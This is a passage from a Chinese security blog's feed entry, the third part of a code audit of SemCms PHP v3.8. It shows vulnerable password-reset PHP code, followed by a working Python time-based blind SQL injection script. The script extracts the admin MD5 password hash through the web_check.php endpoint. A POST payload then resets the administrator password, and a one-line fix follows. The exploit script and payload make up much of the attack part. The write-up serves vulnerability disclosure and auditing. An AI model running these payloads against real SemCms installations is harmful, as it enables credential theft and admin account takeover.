class="keyword">empty</span>($umail) || <span class="keyword">empty</span>($umm) || <span class="keyword">empty</span>($urzm))&#123;</span><br><span class="line">         </span><br><span class="line">          <span class="keyword">echo</span><span class="string">'&lt;script language="javascript"&gt;alert("请输入密码与认证码！");history.go(-1);&lt;/script&gt;'</span>;   </span><br><span class="line">         </span><br><span class="line">     &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">         $query=$db_conn-&gt;query(<span class="string">"select * from sc_user where user_email='"</span>.$umail.<span class="string">"' and user_rzm='"</span>.$urzm.<span class="string">"'"</span>);</span><br><span class="line">         <span class="keyword">if</span> (mysqli_num_rows($query)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">         $db_conn-&gt;query(<span class="string">"UPDATE  sc_user SET user_ps=md5($umm)  WHERE user_email='"</span>.$umail.<span class="string">"' and user_rzm='$urzm'"</span>); </span><br><span class="line">         <span class="keyword">echo</span><span class="string">'&lt;script language="javascript"&gt;alert("操作成功返回登陆！");location.href="'</span>.$fhurl.<span class="string">'";&lt;/script&gt;'</span>;</span><br><span class="line">         &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">          <span class="keyword">echo</span><span class="string">'&lt;script language="javascript"&gt;alert("邮箱或者验证码错误");location.href="'</span>.$fhurl.<span class="string">'";&lt;/script&gt;'</span>;  </span><br><span class="line">         &#125; </span><br><span class="line">         </span><br><span class="line">     &#125;   </span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>而仔细观察后发现，这里漏洞利用点是前面两篇出现问题的集合，第一篇中讲到可以通过sql盲注获取当前表段的内容，但是由于在那张表中的信息没有很多用处而显得相对鸡肋。而第二篇则是查询两个参数，由于没有对反斜线做过滤，导致前一个参数可以将单引号转义，从而与后面参数单引号闭合导致注入。<br>这里的问题便是两个参数，前者可以将后者闭合，而当前表又是存储了账号密码的<code>sc_user</code>表，是第一篇的鸡肋得到放大。</p><h2 id="0x02-poc"><a href="#0x02-poc" class="headerlink" title="0x02 poc"></a>0x02 poc</h2><p>话不多说，直接放上payload<br><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import <span class="built_in">time</span></span><br><span class="line"></span><br><span class="line">burp0_url = <span class="string">"http://127.0.0.1:80/semcms_php_v3.8/include/web_check.php?type=findok"</span></span><br><span class="line">burp0_headers = &#123;<span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"</span>, <span class="string">"Accept"</span>: <span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"</span>, <span class="string">"Accept-Language"</span>: <span class="string">"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2"</span>, <span class="string">"Referer"</span>: <span class="string">"http://127.0.0.1/semcms_php_v3.8/include/web_check.php?type=finddo&amp;XDEBUG_SESSION_START=17436"</span>, <span class="string">"Content-Type"</span>: <span class="string">"application/x-www-form-urlencoded"</span>, <span class="string">"Connection"</span>: <span class="string">"close"</span>, <span class="string">"Upgrade-Insecure-Requests"</span>: <span class="string">"1"</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"or if(ascii(substr(user_ps,&#123;0&#125;,1)) like &#123;1&#125;,sleep(3),1)-- -"</span></span><br><span class="line">passwd = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1</span>,<span class="number">33</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> xrange(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">burp0_data=&#123;<span class="string">"Email"</span>: <span class="string">"1\\\\"</span>, <span class="string">"umima"</span>: <span class="string">"boogle"</span>, <span class="string">"uyzm"</span>: payload.<span class="built_in">format</span>(str(i),str(j))&#125;</span><br><span class="line">start_time = <span class="built_in">time</span>.<span class="built_in">time</span>()</span><br><span class="line">res = requests.post(burp0_url,headers=burp0_headers,data=burp0_data)</span><br><span class="line">#<span class="built_in">print</span> burp0_data</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">time</span>.<span class="built_in">time</span>()-start_time &gt; <span class="number">3</span>:</span><br><span class="line">passwd+=chr(j)</span><br><span class="line"><span class="built_in">print</span> <span class="string">"[+]The md5 password is :"</span>+passwd</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">"[+]Success get the password!"</span></span><br></pre></td></tr></table></figure></p><h2 id="0x03-修改后台密码"><a href="#0x03-修改后台密码" class="headerlink" title="0x03 修改后台密码"></a>0x03 修改后台密码</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$db_conn</span>-&gt;query(<span class="string">"UPDATE  sc_user SET user_ps=md5(<span class="variable">$umm</span>)  WHERE user_email='"</span>.<span class="variable">$umail</span>.<span class="string">"' and user_rzm='<span class="variable">$urzm</span>'"</span>);</span><br></pre></td></tr></table></figure><p>对前面的payload执行结果可以看到，这里由于数据库中对密码采用md5加密，如果密码比较复杂的话，可以就无法查询出明文结果。<br><img src="https://i.loli.net/2019/03/15/5c8b1ddb08bee.png" alt><br>那么便可以继续查看<code>findok</code>后面的<code>update</code>操作。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$db_conn</span>-&gt;query(<span class="string">"UPDATE  sc_user SET user_ps=md5(<span class="variable">$umm</span>)  WHERE user_email='"</span>.<span class="variable">$umail</span>.<span class="string">"' and user_rzm='<span class="variable">$urzm</span>'"</span>);</span><br></pre></td></tr></table></figure></p><p>在该操作中，如果知道<code>$umail</code>和<code>$urzm</code>的值，便可以对密码进行修改。<br>而这两个值均可以通过前面注入出密码的方法得到，这里不再赘述，诸位可自行继续操作。<br>例如此处得到<a href="mailto:`$umail=boogle@qq.com" target="_blank" rel="noopener">`$umail=boogle@qq.com</a><code></code>$urzm=6666`<br>修改密码payload<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//post</span></span><br><span class="line"></span><br><span class="line">Email=boogle@qq.com<span class="variable">&amp;umima</span>=boogle_password<span class="variable">&amp;urzm</span>=<span class="number">6666</span></span><br></pre></td></tr></table></figure></p><p>此处成功修改后台管理员密码为<code>123</code><br><img src="https://i.loli.net/2019/03/15/5c8b9c15355d0.png" alt></p><h2 id="0x04-修复方法"><a href="#0x04-修复方法" class="headerlink" title="0x04 修复方法"></a>0x04 修复方法</h2><p>还是可以通过之前的修复方法，对反斜线<code>\</code>增加过滤即可。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;此篇为审计semcms_php_v3.8的第三篇文章&lt;/p&gt;
&lt;p&gt;SemCms是一套开源外贸企业网
      
    
    </summary>
    
      <category term="web安全" scheme="https://zhengbao.wang/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="代码审计" scheme="https://zhengbao.wang/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="0day挖掘" scheme="https://zhengbao.wang/tags/0day%E6%8C%96%E6%8E%98/"/>
    
  </entry>
  
</feed>
